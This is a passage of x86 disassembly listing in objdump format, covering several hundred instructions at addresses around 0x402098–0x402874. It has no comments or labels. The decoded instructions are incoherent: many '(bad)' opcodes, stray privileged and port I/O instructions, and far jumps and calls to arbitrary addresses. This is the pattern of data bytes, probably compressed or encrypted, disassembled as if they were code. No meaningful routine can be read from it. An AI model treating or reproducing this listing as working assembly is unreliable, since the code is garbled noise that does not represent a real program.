  402098:	adc    al,BYTE PTR [ecx]
  40209a:	fdivr  QWORD PTR [ebp-0x1df83806]
  4020a0:	add    cl,bl
  4020a2:	mov    esi,0x8142f7e1
  4020a7:	sbb    al,0xc6
  4020a9:	cwde   
  4020aa:	jnp    0x40209d
  4020ac:	mov    es,WORD PTR [edx-0x4d752517]
  4020b2:	xor    dl,BYTE PTR [edi+ebp*1+0x70]
  4020b6:	pop    ss
  4020b7:	imul   ebp,DWORD PTR [edi+0x57f0441c],0x66
  4020be:	data16 and dl,BYTE PTR [ecx+0x677214aa]
  4020c5:	inc    esp
  4020c6:	pop    ss
  4020c7:	lods   eax,DWORD PTR ds:[esi]
  4020c8:	push   ds
  4020c9:	pop    ecx
  4020ca:	arpl   WORD PTR [eax],sp
  4020cc:	dec    ebx
  4020cd:	adc    DWORD PTR [eax+ebp*4],0xffffffef
  4020d1:	add    BYTE PTR [esp+ebp*8-0x2e],ah
  4020d5:	sti    
  4020d6:	xor    edi,ecx
  4020d8:	push   eax
  4020d9:	hlt    
  4020da:	pop    ds
  4020db:	mov    edi,0x26687772
  4020e0:	mov    ch,0x47
  4020e2:	ins    DWORD PTR es:[edi],dx
  4020e3:	fisubr WORD PTR [ecx+0x3a]
  4020e6:	test   al,0xd3
  4020e8:	push   edi
  4020e9:	push   esp
  4020ea:	out    dx,eax
  4020eb:	mov    al,0x33
  4020ed:	sti    
  4020ee:	pop    eax
  4020ef:	dec    esp
  4020f0:	xor    edi,eax
  4020f2:	add    ebp,DWORD PTR [esi-0x47]
  4020f5:	ret    0x591e
  4020f8:	cs dec edx
  4020fa:	stos   BYTE PTR es:[edi],al
  4020fb:	lahf   
  4020fc:	cld    
  4020fd:	hlt    
  4020fe:	loop   0x402088
  402100:	les    edx,FWORD PTR ds:0xb62986c6
  402106:	test   edx,edi
  402108:	xchg   edx,eax
  402109:	or     BYTE PTR [ecx+0x31],dl
  40210c:	sti    
  40210d:	loop   0x402178
  40210f:	push   ebp
  402110:	pop    ss
  402111:	or     BYTE PTR [esi-0x58],cl
  402114:	setl   BYTE PTR ds:0x35b03294
  40211b:	lahf   
  40211c:	jne    0x40219b
  40211e:	or     eax,0xd6f39ead
  402123:	imul   ebp,DWORD PTR [ecx-0xc73cee],0x238ae728
  40212d:	sbb    DWORD PTR [ebx+0x779f8d0e],ebx
  402133:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402134:	test   al,0xce
  402136:	jge    0x402194
  402138:	or     ch,al
  40213a:	jnp    0x40210e
  40213c:	fucom  st(6)
  40213e:	(bad)  
  40213f:	es loop 0x4021ab
  402142:	push   0x32fa98ae
  402147:	fisubr WORD PTR [esi+0x15]
  40214a:	xchg   edi,eax
  40214b:	stos   DWORD PTR es:[edi],eax
  40214c:	stc    
  40214d:	jbe    0x402158
  40214f:	sub    BYTE PTR [eax],cl
  402151:	stc    
  402152:	inc    edx
  402153:	imul   edi,edx,0x892f8e62
  402159:	xchg   esp,eax
  40215a:	adc    edx,DWORD PTR [ebx]
  40215c:	mov    ebx,0x72d190cc
  402161:	lds    ebp,FWORD PTR [edi]
  402163:	jae    0x4021c4
  402165:	in     al,dx
  402166:	lahf   
  402167:	outs   dx,DWORD PTR ds:[esi]
  402168:	test   ebx,0xdc4e6c1e
  40216e:	inc    ebx
  40216f:	mov    dh,0x8e
  402171:	test   DWORD PTR [esi+0x65],ebx
  402174:	frstor [ebx-0x59]
  402177:	push   ebp
  402178:	outs   dx,DWORD PTR ds:[esi]
  402179:	sbb    bh,dh
  40217b:	cmovno esi,DWORD PTR [ecx-0x2a]
  40217f:	or     ebp,DWORD PTR [edi]
  402181:	outs   dx,DWORD PTR ds:[esi]
  402182:	mov    cl,0xe5
  402184:	or     eax,0x4d9857c4
  402189:	jns    0x4021f3
  40218b:	mov    dh,0xbd
  40218d:	int    0xcd
  40218f:	inc    edi
  402190:	jns    0x402175
  402192:	(bad)
  402195:	pop    ebx
  402196:	or     eax,0xb2fde739
  40219b:	cld    
  40219c:	addr16 retf 0x7967
  4021a0:	xchg   DWORD PTR [eax+0x16cd068f],esp
  4021a6:	jmp    0x4828e8bd
  4021ab:	and    dl,0xdf
  4021ae:	cmp    eax,0xfe36d02d
  4021b3:	push   edi
  4021b4:	cmp    eax,0x9402597b
  4021b9:	push   ecx
  4021ba:	inc    ecx
  4021bb:	dec    esp
  4021bc:	arpl   WORD PTR [edi-0x16996339],bx
  4021c2:	mov    ch,0xb3
  4021c4:	fadd   QWORD PTR [ebx-0x2eabcb6d]
  4021ca:	adc    edx,ebx
  4021cc:	sahf   
  4021cd:	mov    dl,0x25
  4021cf:	push   ds
  4021d0:	int    0xdf
  4021d2:	not    DWORD PTR [esi-0x7d]
  4021d5:	rol    BYTE PTR [ecx+0x38],0xa7
  4021d9:	inc    edx
  4021da:	(bad)  
  4021db:	loopne 0x40215f
  4021dd:	and    eax,ebx
  4021df:	das    
  4021e0:	div    DWORD PTR ds:0xa08917f3
  4021e6:	xchg   esp,eax
  4021e7:	push   esp
  4021e8:	call   0xeb2c3d0a
  4021ed:	and    ecx,ebx
  4021ef:	and    BYTE PTR [edi],cl
  4021f1:	sbb    DWORD PTR [esi+0x5e7e025d],edx
  4021f7:	xor    ebp,edi
  4021f9:	pop    ds
  4021fa:	jle    0x402276
  4021fc:	shl    BYTE PTR [edx-0x67],cl
  4021ff:	lock in al,dx
  402201:	and    eax,DWORD PTR [ecx+0x28]
  402204:	jle    0x402253
  402206:	stc    
  402207:	test   al,0x1d
  402209:	mov    esp,0x9614cac0
  40220e:	mov    bh,BYTE PTR [ebp-0x2d]
  402211:	dec    ecx
  402212:	push   0x49e86ef4
  402217:	ret    
  402218:	jge    0x402287
  40221a:	mov    ebx,0xd94deccf
  40221f:	aas    
  402220:	and    dl,BYTE PTR [edx]
  402222:	test   eax,0x7fc5b861
  402227:	jmp    0x7fad6b94
  40222c:	or     ebx,DWORD PTR [ebx]
  40222e:	xchg   ebx,eax
  40222f:	(bad)  
  402230:	stc    
  402231:	rcr    DWORD PTR ds:0x65d3524f,0x28
  402238:	sbb    eax,0x355a5913
  40223d:	mov    eax,ds:0x6e5fab35
  402242:	cld    
  402243:	push   ebx
  402244:	icebp  
  402245:	xchg   ebp,eax
  402246:	sbb    DWORD PTR [edi],ebx
  402248:	sub    DWORD PTR [ebp+0xbc944e0],edi
  40224e:	daa    
  40224f:	shl    BYTE PTR [ebp-0x62608b42],0xd3
  402256:	aas    
  402257:	stos   DWORD PTR es:[edi],eax
  402258:	add    bh,BYTE PTR [esp+ebp*2+0x73368375]
  40225f:	test   DWORD PTR [esi],0xd5abae94
  402265:	addr16 cs test edi,ebx
  402269:	in     eax,0x28
  40226b:	mov    eax,ds:0xa8b869e0
  402270:	(bad)
  402273:	xchg   ebx,eax
  402274:	add    al,BYTE PTR [esi+0x21]
  402277:	mov    al,ds:0xf17fb8cd
  40227c:	retf   0xfd72
  40227f:	test   DWORD PTR [ecx],edi
  402281:	cmp    DWORD PTR [edx-0x5ad86400],edi
  402287:	jle    0x40220f
  402289:	fucom  st(1)
  40228b:	and    ch,BYTE PTR [ebx+eax*1]
  40228e:	ss aam 0x43
  402291:	inc    esi
  402292:	xlat   BYTE PTR ds:[ebx]
  402293:	iret   
  402294:	nop
  402295:	out    0xaa,eax
  402297:	inc    ebp
  402298:	adc    bh,BYTE PTR [eax-0x23]
  40229b:	pop    ecx
  40229c:	in     eax,0xc3
  40229e:	rol    DWORD PTR [esi-0x5e],cl
  4022a1:	dec    ebp
  4022a2:	sub    al,0x2a
  4022a4:	imul   edx,DWORD PTR [edi+0x35],0x23
  4022a8:	xor    BYTE PTR [esi+eiz*1-0x6f68c35],dl
  4022af:	mov    BYTE PTR [ebp+0x2a],dl
  4022b2:	and    BYTE PTR [edi],cl
  4022b4:	pop    es
  4022b5:	lods   al,BYTE PTR ds:[esi]
  4022b6:	(bad)  
  4022b7:	std    
  4022b8:	pop    esi
  4022b9:	add    DWORD PTR [eax-0x16ac4a59],ebx
  4022bf:	fimul  WORD PTR [eax]
  4022c1:	cli    
  4022c2:	jmp    0xf88b:0xc41d9cd6
  4022c9:	jbe    0x40228e
  4022cb:	popa   
  4022cc:	push   edx
  4022cd:	sub    eax,0x3b7709f0
  4022d2:	popa   
  4022d3:	mov    esp,0x27b30d81
  4022d8:	inc    esi
  4022d9:	sbb    esp,DWORD PTR [esi+0x1b]
  4022dc:	lock leave 
  4022de:	adc    al,0x9f
  4022e0:	test   DWORD PTR [ebx+ebp*1],ebp
  4022e3:	repnz std 
  4022e5:	dec    ebp
  4022e6:	mov    ebx,DWORD PTR [eax+edx*1+0x4d9620f6]
  4022ed:	out    dx,al
  4022ee:	add    BYTE PTR [ebx+0x2a],bl
  4022f1:	mov    edi,ds
  4022f3:	dec    eax
  4022f4:	add    eax,0x9415b79d
  4022f9:	push   esp
  4022fa:	(bad)  
  4022fb:	out    0xb7,eax
  4022fd:	pop    ebp
  4022fe:	repz mov ah,0x4
  402301:	sub    ebp,esi
  402303:	shr    al,1
  402305:	inc    edi
  402306:	(bad)  
  402307:	adc    al,0x95
  402309:	sbb    DWORD PTR [esi+0x3e19e8e],ebx
  40230f:	das    
  402310:	pop    es
  402311:	test   BYTE PTR [ecx-0x4e],0x9d
  402315:	test   DWORD PTR [ebp-0x3bce9d98],esp
  40231b:	pusha  
  40231c:	mov    bl,0x86
  40231e:	add    eax,0x9a9d1805
  402323:	push   ebx
  402324:	or     dl,BYTE PTR [ebp-0x668ebe79]
  40232a:	cs xchg edi,eax
  40232c:	push   edi
  40232d:	mov    bl,0x91
  40232f:	push   cs
  402330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402331:	dec    eax
  402332:	adc    ecx,0x73
  402335:	mov    ds:0x1f2c685b,eax
  40233a:	inc    edi
  40233b:	xchg   DWORD PTR [edi],ebx
  40233d:	add    ch,BYTE PTR [ecx-0x25]
  402340:	stos   BYTE PTR es:[edi],al
  402341:	scas   eax,DWORD PTR es:[edi]
  402342:	or     ah,BYTE PTR [edx+0x1e9d6186]
  402348:	adc    DWORD PTR [esi+0x1a],ecx
  40234b:	jmp    0xab0e:0x81ff3006
  402352:	fst    QWORD PTR [eax-0x4966e01f]
  402358:	data16 rol BYTE PTR [ebp-0xfccdae6],1
  40235f:	sbb    al,0xf7
  402361:	ins    DWORD PTR es:[edi],dx
  402362:	xor    BYTE PTR [ecx-0x69d2a1c1],0x3b
  402369:	xor    eax,0xf57a81a8
  40236e:	xchg   esi,eax
  40236f:	and    edi,eax
  402371:	sub    esi,edx
  402373:	cmc    
  402374:	retf   0xa25c
  402377:	arpl   WORD PTR [ebx+0x6f9c3eb2],si
  40237d:	and    ah,BYTE PTR [eax+0x5c]
  402380:	mov    ecx,esp
  402382:	add    al,0x3a
  402384:	cli    
  402385:	sar    BYTE PTR [ebp+0x19],0x27
  402389:	out    0x74,eax
  40238b:	push   esp
  40238c:	mov    bh,0x3b
  40238e:	sub    edi,DWORD PTR [ebx+0x14]
  402391:	mov    ds:0x781ca0ec,al
  402396:	ss push ds
  402398:	addr16 js 0x4023b1
  40239b:	jmp    0xe443:0x1bb76145
  4023a2:	mov    al,es:0x7e832d8c
  4023a8:	int3   
  4023a9:	(bad)  
  4023aa:	sub    DWORD PTR [esi],ebp
  4023ac:	dec    ebp
  4023ad:	rcr    ah,1
  4023af:	push   0x1cb33dc9
  4023b4:	push   ds
  4023b5:	push   0xb93baee3
  4023ba:	sbb    BYTE PTR [eax],cl
  4023bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023bd:	scas   al,BYTE PTR es:[edi]
  4023be:	mov    dh,0x9a
  4023c0:	and    esp,ebp
  4023c2:	and    esp,DWORD PTR [edx-0x4b5da29e]
  4023c8:	mov    ah,0xf7
  4023ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023cb:	cwde   
  4023cc:	cmp    eax,0xb91c9c35
  4023d1:	cld    
  4023d2:	adc    eax,0xc8e9a905
  4023d7:	xchg   edx,eax
  4023d8:	pushf  
  4023d9:	das    
  4023da:	test   edi,ecx
  4023dc:	sar    BYTE PTR [edi+eax*1-0x1d41ce7e],0xda
  4023e4:	mov    dl,BYTE PTR [esi-0x2f]
  4023e7:	nop
  4023e8:	add    edx,DWORD PTR [esi+0x23]
  4023eb:	adc    edx,DWORD PTR [eax]
  4023ed:	lods   al,BYTE PTR ds:[esi]
  4023ee:	ror    BYTE PTR [esi+0xf],0x23
  4023f2:	xchg   esp,eax
  4023f3:	dec    edi
  4023f4:	jmp    0xbc4ae512
  4023f9:	scas   al,BYTE PTR es:[edi]
  4023fa:	iret   
  4023fb:	jae    0x40245b
  4023fd:	cs out dx,al
  4023ff:	(bad)  
  402401:	xor    BYTE PTR [edx+0x7ccb75b8],dh
  402407:	mov    bh,0x5e
  402409:	stos   BYTE PTR es:[edi],al
  40240a:	das    
  40240b:	xchg   ebx,eax
  40240c:	out    dx,al
  40240d:	outs   dx,BYTE PTR ds:[esi]
  40240e:	inc    DWORD PTR [edi+0x23]
  402411:	and    al,0x3e
  402413:	jmp    0x11c2e47d
  402418:	ret    0x4ef1
  40241b:	in     eax,0x5
  40241d:	pushf  
  40241e:	sub    bh,BYTE PTR [ebx+edi*4]
  402421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402422:	clc    
  402423:	je     0x40247b
  402425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402426:	xchg   edi,eax
  402427:	sub    dh,0x6d
  40242a:	icebp  
  40242b:	retf   0x1ad9
  40242e:	and    DWORD PTR [edi-0x68a2d7bb],0x3a47c474
  402438:	inc    ecx
  402439:	jb     0x4024a0
  40243b:	nop
  40243c:	inc    edx
  40243d:	fdiv   st,st(3)
  40243f:	rcr    BYTE PTR [esi],cl
  402441:	repz dec ebx
  402443:	jae    0x402468
  402445:	xor    eax,0xe70ca027
  40244a:	test   BYTE PTR [ebx-0x688b7367],bl
  402450:	into   
  402451:	mov    ebp,0x1abfccdd
  402456:	ins    DWORD PTR es:[edi],dx
  402457:	fsub   QWORD PTR [esi+0x45634121]
  40245d:	test   al,0xd4
  40245f:	cld    
  402460:	sbb    DWORD PTR [edx+0x23425588],esp
  402466:	cld    
  402467:	pop    eax
  402468:	jbe    0x4024e0
  40246a:	jb     0x402419
  40246c:	mov    ecx,0x48ce9f8e
  402471:	pop    ebp
  402472:	and    BYTE PTR [ecx],0x2e
  402475:	in     eax,dx
  402476:	lods   al,BYTE PTR ds:[esi]
  402477:	clc    
  402478:	cmp    DWORD PTR [edx],ecx
  40247a:	rcr    DWORD PTR [edi+0x61],cl
  40247d:	xchg   esi,eax
  40247e:	ror    DWORD PTR [ebx+0x51],0x5a
  402482:	cmp    al,0xd3
  402484:	neg    ebp
  402486:	or     DWORD PTR [eax],ebp
  402488:	sub    eax,0x401d0eb
  40248d:	fs sahf 
  40248f:	mov    edi,0x13b72362
  402494:	test   DWORD PTR [eax-0x40df1c51],edi
  40249a:	call   0x6e08fd20
  40249f:	dec    eax
  4024a0:	sar    ah,0x5
  4024a3:	mov    al,0x7
  4024a5:	cwde   
  4024a6:	jnp    0x40244a
  4024a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024a9:	sub    edi,DWORD PTR [esi-0x542f0dbc]
  4024af:	push   ebx
  4024b0:	jmp    0x8f468758
  4024b5:	xchg   ebx,eax
  4024b6:	or     al,0x99
  4024b8:	dec    ecx
  4024b9:	call   0x852bd982
  4024be:	dec    edi
  4024bf:	cmp    BYTE PTR [esi+0x215f2613],dh
  4024c5:	or     ebp,DWORD PTR [eax+ebx*8+0x34]
  4024c9:	push   edx
  4024ca:	data16 mov bl,0x51
  4024cd:	(bad)  
  4024ce:	push   ecx
  4024cf:	xor    BYTE PTR [eax+0x4d65ecd],dh
  4024d5:	mov    ds:0xb97afd41,eax
  4024da:	sahf   
  4024db:	stos   BYTE PTR es:[edi],al
  4024dc:	xor    DWORD PTR [esi-0x71],edx
  4024df:	mov    al,ds:0x5fb844ff
  4024e4:	mov    ah,0x81
  4024e6:	xchg   esp,eax
  4024e7:	cmp    BYTE PTR [ebx+ebx*4+0x28],cl
  4024eb:	push   edi
  4024ec:	mov    ebx,0xe39403e2
  4024f1:	cmp    BYTE PTR [esi-0x1bd1ead2],ch
  4024f7:	imul   ebx,DWORD PTR [esi],0xb5c277ed
  4024fd:	pop    eax
  4024fe:	adc    bl,BYTE PTR [esi-0x41c05e6b]
  402504:	aad    0x59
  402506:	pop    ds
  402507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402508:	fcom   DWORD PTR [esi]
  40250a:	scas   eax,DWORD PTR es:[edi]
  40250b:	dec    edx
  40250c:	retf   
  40250d:	sub    BYTE PTR [ebx-0x7e],0xc
  402511:	mov    cl,0x9d
  402513:	push   es
  402514:	push   edx
  402515:	add    al,0xee
  402517:	cmp    ebp,DWORD PTR [ebx-0x46]
  40251a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40251b:	add    eax,0x20791353
  402520:	inc    eax
  402521:	not    ebp
  402523:	cmp    BYTE PTR [edx],ch
  402525:	frstor [edx+0x4e87d7d]
  40252b:	pop    eax
  40252c:	cdq    
  40252d:	jns    0x4024d1
  40252f:	out    0xbe,al
  402531:	mov    edi,0x58ae0fdc
  402536:	pop    ss
  402537:	mov    ebp,0x47b50e4a
  40253c:	sti    
  40253d:	push   cs
  40253e:	(bad)
  402541:	xchg   DWORD PTR [ecx],ecx
  402543:	dec    edx
  402544:	adc    eax,0x8c49c3f0
  402549:	loopne 0x40252b
  40254b:	and    dh,BYTE PTR [ebx]
  40254d:	ret    
  40254e:	idiv   DWORD PTR [esi-0x19541c66]
  402554:	xor    DWORD PTR [ebx],eax
  402556:	fs test al,0x45
  402559:	mov    esi,0xce4a24b
  40255e:	fisub  WORD PTR [ebp+edx*4+0x53176a53]
  402565:	shr    DWORD PTR [eax+0x16],cl
  402568:	shl    DWORD PTR [esi-0x2c],cl
  40256b:	ins    BYTE PTR es:[edi],dx
  40256c:	shl    DWORD PTR [eax+0x1aba5cb0],0x45
  402573:	mov    cl,0x10
  402575:	aaa    
  402576:	cmp    bh,BYTE PTR [ebx-0x44ace32]
  40257c:	inc    ebx
  40257d:	mov    cl,BYTE PTR [esi-0x7aeae7cd]
  402583:	or     eax,0x913a6407
  402588:	add    ecx,DWORD PTR [eax+0x46]
  40258b:	daa    
  40258c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40258d:	retf   
  40258e:	out    0x12,eax
  402590:	fidiv  WORD PTR [eax+eiz*4+0x3]
  402594:	loope  0x4025c1
  402596:	mov    dl,0x61
  402598:	jo     0x402618
  40259a:	adc    ah,BYTE PTR gs:[ebx]
  40259d:	cmp    ah,cl
  40259f:	dec    ecx
  4025a0:	mov    dl,bh
  4025a2:	inc    edx
  4025a3:	mov    ah,BYTE PTR [edx+ebx*1]
  4025a6:	sub    BYTE PTR [ebp-0x6789b1b8],dl
  4025ac:	loopne 0x402554
  4025ae:	retfw  
  4025b0:	inc    ebp
  4025b1:	stos   DWORD PTR es:[edi],eax
  4025b2:	ret    
  4025b3:	hlt    
  4025b4:	js     0x402605
  4025b6:	push   ecx
  4025b7:	imul   ebx,DWORD PTR [eax-0x3e8c3445],0xb44639da
  4025c1:	or     BYTE PTR [ecx-0x1a],dh
  4025c4:	push   ss
  4025c5:	adc    BYTE PTR [esi+eax*2+0x7c],ah
  4025c9:	ror    DWORD PTR [edx-0x51],1
  4025cc:	dec    ecx
  4025cd:	xlat   BYTE PTR ds:[ebx]
  4025ce:	dec    ecx
  4025cf:	loop   0x402564
  4025d1:	mov    es,WORD PTR [edi]
  4025d3:	push   eax
  4025d4:	or     eax,0x3cdb8d80
  4025d9:	mov    esi,0x41d574c8
  4025de:	fisub  DWORD PTR fs:[edx+edx*1]
  4025e2:	shl    DWORD PTR [eax+eax*2],1
  4025e5:	or     DWORD PTR [ecx-0x8efe5b0],eax
  4025eb:	ss mov ds,edi
  4025ee:	or     al,0xb1
  4025f0:	(bad)  
  4025f1:	int    0x83
  4025f3:	cli    
  4025f4:	mov    BYTE PTR [ecx],ch
  4025f6:	fcomp  DWORD PTR [esi]
  4025f8:	or     eax,0xc678d8d5
  4025fd:	mov    eax,0xb800cbb
  402602:	pop    edi
  402603:	aad    0xa0
  402605:	bound  ecx,QWORD PTR [edx]
  402607:	inc    ecx
  402608:	jne    0x4025a9
  40260a:	ret    
  40260b:	imul   ebp,DWORD PTR [ebp-0x6d],0x2d4912fa
  402612:	aam    0x2d
  402614:	xor    bh,dl
  402616:	push   ss
  402617:	outs   dx,DWORD PTR ds:[esi]
  402618:	je     0x4025d0
  40261a:	mov    cl,0xba
  40261c:	dec    esi
  40261d:	dec    eax
  40261e:	add    BYTE PTR [edi-0x2e],dh
  402621:	test   eax,0x3c15cd72
  402626:	ds cmp ecx,esi
  402629:	(bad)  
  40262a:	std    
  40262b:	xor    ecx,edx
  40262d:	(bad)  
  40262e:	lahf   
  40262f:	mov    ebx,0xb227e1a7
  402634:	mov    WORD PTR [esi],cs
  402636:	not    DWORD PTR fs:[ebx+esi*1+0x2ebffb64]
  40263e:	lea    edi,[eax+0x6]
  402641:	xchg   esi,eax
  402642:	icebp  
  402643:	push   edi
  402644:	scas   al,BYTE PTR es:[edi]
  402645:	(bad)  
  402646:	out    dx,eax
  402647:	jle    0x402616
  402649:	stc    
  40264a:	jmp    0x4025e5
  40264c:	dec    ecx
  40264d:	sbb    al,0x2e
  40264f:	pop    edx
  402650:	mov    BYTE PTR [ebp+0x2],bh
  402653:	call   0xefa:0x5b5ea981
  40265a:	stc    
  40265b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40265c:	test   DWORD PTR [edi+0x62],ecx
  40265f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402660:	dec    edi
  402661:	sti    
  402662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402663:	repz jl 0x4026db
  402666:	fs mov eax,0x6f9145df
  40266c:	push   ebp
  40266d:	pop    ss
  40266e:	cmp    eax,0x9943f88e
  402673:	xor    ch,ch
  402675:	xor    al,0xbe
  402677:	out    dx,eax
  402678:	out    0x2,al
  40267a:	or     esi,DWORD PTR [ecx-0x332c06d5]
  402680:	mov    dl,0xd0
  402682:	test   DWORD PTR [ebp-0x7d],esi
  402685:	dec    ebp
  402686:	cmp    ch,BYTE PTR [esi]
  402688:	mov    dl,0x3b
  40268a:	shl    BYTE PTR [ebp-0x44],0xe2
  40268e:	inc    ebx
  40268f:	aas    
  402690:	loope  0x402662
  402692:	push   ebp
  402693:	push   edi
  402694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402695:	clc    
  402696:	push   ss
  402697:	aas    
  402698:	jns    0x402634
  40269a:	xchg   ecx,eax
  40269b:	sub    dl,cl
  40269d:	(bad)  
  40269e:	faddp  st(4),st
  4026a0:	push   eax
  4026a1:	mov    ebp,0xe0118943
  4026a6:	fadd   QWORD PTR [ecx-0x6d7f9b1c]
  4026ac:	or     al,0x16
  4026ae:	sbb    eax,0xc0e4ef0c
  4026b3:	xor    DWORD PTR [edx],ebx
  4026b5:	lahf   
  4026b6:	nop
  4026b7:	push   esi
  4026b8:	ds mov bl,0x98
  4026bb:	js     0x40268f
  4026bd:	add    DWORD PTR [ecx],ecx
  4026bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026c0:	jg     0x402681
  4026c2:	iret   
  4026c3:	jns    0x40273e
  4026c5:	es stos DWORD PTR es:[edi],eax
  4026c7:	sbb    eax,0x50bf43cb
  4026cc:	or     al,0xa1
  4026ce:	stc    
  4026cf:	xchg   esi,eax
  4026d0:	xlat   BYTE PTR ds:[ebx]
  4026d1:	cld    
  4026d2:	aad    0x68
  4026d4:	mov    bh,0xee
  4026d6:	push   edi
  4026d7:	neg    BYTE PTR [ecx+0x7d72de2b]
  4026dd:	xchg   ecx,eax
  4026de:	out    dx,al
  4026df:	fild   QWORD PTR [edx+0x1b]
  4026e2:	rcl    bh,cl
  4026e4:	into   
  4026e5:	addr16 mov edx,0xb9dc5d3a
  4026eb:	inc    edi
  4026ec:	(bad)  
  4026ed:	retf   0x3185
  4026f0:	xchg   esp,eax
  4026f1:	jmp    0x6163:0x76bfc894
  4026f8:	and    eax,0x8f536cee
  4026fd:	pop    ss
  4026fe:	sti    
  4026ff:	and    al,dl
  402701:	sub    bh,BYTE PTR [ebx-0x42]
  402704:	aam    0xf1
  402706:	jno    0x4026d4
  402708:	ret    
  402709:	mov    bl,0x6c
  40270b:	or     esi,DWORD PTR [edx+0x30]
  40270e:	out    0x66,eax
  402710:	hlt    
  402711:	je     0x402735
  402713:	mov    ebx,0xd64cb9cd
  402718:	jg     0x402766
  40271a:	mov    edi,0xc0d66e78
  40271f:	cwde   
  402720:	test   eax,0x7c653aca
  402725:	cs xor al,0xa7
  402728:	jecxz  0x402749
  40272a:	xor    eax,0x480e8c1a
  40272f:	mov    edx,fs
  402731:	mov    al,bh
  402733:	pop    eax
  402734:	add    BYTE PTR [ebx+eax*8+0x4c],ch
  402738:	mov    ebp,0x14352209
  40273d:	fcom   st(7)
  40273f:	loop   0x4026e1
  402741:	adc    al,BYTE PTR [di+0xc]
  402745:	inc    ebp
  402746:	fidiv  DWORD PTR [ebp-0x40]
  402749:	dec    ebx
  40274a:	pop    ecx
  40274b:	mov    al,ds:0xb649bffd
  402750:	les    ebx,FWORD PTR [edx+0x52]
  402753:	fstp   QWORD PTR [ecx+0x47]
  402756:	adc    esp,DWORD PTR [ecx+ecx*1+0x46]
  40275a:	cmp    ebx,edi
  40275c:	sub    ebp,edx
  40275e:	push   edi
  40275f:	inc    eax
  402760:	daa    
  402761:	pop    esi
  402762:	sub    DWORD PTR [ecx+0x5],esp
  402765:	push   edx
  402766:	ror    BYTE PTR [ebx+ecx*8+0x68],0x8
  40276b:	inc    eax
  40276c:	xor    eax,0x8ebeadae
  402771:	stc    
  402772:	test   eax,0x4cac73f2
  402777:	jo     0x402764
  402779:	frstor [ecx]
  40277b:	rol    BYTE PTR [ecx],1
  40277d:	lds    ebx,FWORD PTR [eax+0x2ab11846]
  402783:	sar    BYTE PTR [ecx],0x78
  402786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402787:	push   ds
  402788:	push   edx
  402789:	cmc    
  40278a:	lds    ebp,FWORD PTR [edx]
  40278c:	in     eax,0x49
  40278e:	cld    
  40278f:	push   ebp
  402790:	jle    0x40277e
  402792:	cmp    al,0xf3
  402794:	aas    
  402795:	aad    0x5c
  402797:	mov    esi,0x4c613e57
  40279c:	loop   0x40273e
  40279e:	cmova  ebp,DWORD PTR [ebp-0x2c]
  4027a2:	sahf   
  4027a3:	aam    0xe6
  4027a5:	mov    edi,0xee83873c
  4027aa:	test   BYTE PTR [ebp-0x70],dl
  4027ad:	sbb    esp,DWORD PTR ds:0xe70900a4
  4027b3:	das    
  4027b4:	fimul  DWORD PTR [di-0x6ea2]
  4027b9:	adc    al,0x31
  4027bb:	iret   
  4027bc:	sbb    BYTE PTR [ecx-0x78d752f2],cl
  4027c2:	dec    ecx
  4027c3:	inc    esp
  4027c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027c5:	adc    DWORD PTR [ebx+eiz*1],eax
  4027c8:	or     edx,ecx
  4027ca:	cmc    
  4027cb:	ds out dx,al
  4027cd:	jnp    0x402844
  4027cf:	xchg   ebx,eax
  4027d0:	and    DWORD PTR [esi-0x1b],esp
  4027d3:	xor    DWORD PTR [bp+di],0xc1853b5b
  4027da:	add    esp,DWORD PTR [ebx+0x79]
  4027dd:	call   0x1ba68c20
  4027e2:	call   0x298f:0x2a824c8c
  4027e9:	pop    ds
  4027ea:	rcr    BYTE PTR [edi+0x34],0xa0
  4027ee:	call   0x36612d5e
  4027f3:	aaa    
  4027f4:	jb     0x402824
  4027f6:	xor    esp,DWORD PTR [ecx+0x3a]
  4027f9:	outs   dx,DWORD PTR ds:[esi]
  4027fa:	mov    dh,0x86
  4027fc:	aam    0x19
  4027fe:	cmp    DWORD PTR [eax+0xe4c23e6],0x70
  402805:	in     al,dx
  402806:	in     eax,dx
  402807:	fimul  WORD PTR [edx-0x61]
  40280a:	js     0x40280e
  40280c:	cmc    
  40280d:	sbb    ecx,esi
  40280f:	(bad)  
  402810:	dec    edi
  402811:	lea    ebx,[esi+0x79f3bf43]
  402817:	xchg   esi,eax
  402818:	ret    0xedb9
  40281b:	add    ecx,esp
  40281d:	cmp    al,0x3b
  40281f:	dec    ecx
  402820:	mov    bl,0xde
  402822:	sbb    eax,0x38f82773
  402827:	and    BYTE PTR [edi],0x5a
  40282a:	stc    
  40282b:	bound  eax,QWORD PTR [ebp+0x72]
  40282e:	cmp    eax,0x629f5fa6
  402833:	add    ebx,DWORD PTR [eax-0x3bedd890]
  402839:	ror    DWORD PTR [eax-0x3df188b8],1
  40283f:	fsubp  st(0),st
  402841:	jmp    0x39a8:0xbd685c75
  402848:	lods   al,BYTE PTR ds:[esi]
  402849:	popf   
  40284a:	sub    BYTE PTR [eax+edi*4+0x2ad6e9e9],0x68
  402852:	dec    esi
  402853:	push   cs
  402854:	idiv   DWORD PTR [ecx+0x69667a43]
  40285a:	jo     0x4028c1
  40285c:	out    0x7c,al
  40285e:	dec    ebp
  40285f:	jge    0x40289f
  402861:	shr    BYTE PTR [esi],1
  402863:	js     0x40285a
  402865:	shl    ebp,cl
  402867:	cdq    
  402868:	jp     0x402872
  40286a:	push   0x82f3073a
  40286f:	mov    ebp,0xb2163330
  402874:	mov    WORD PTR ds:0x9a5c6774,?
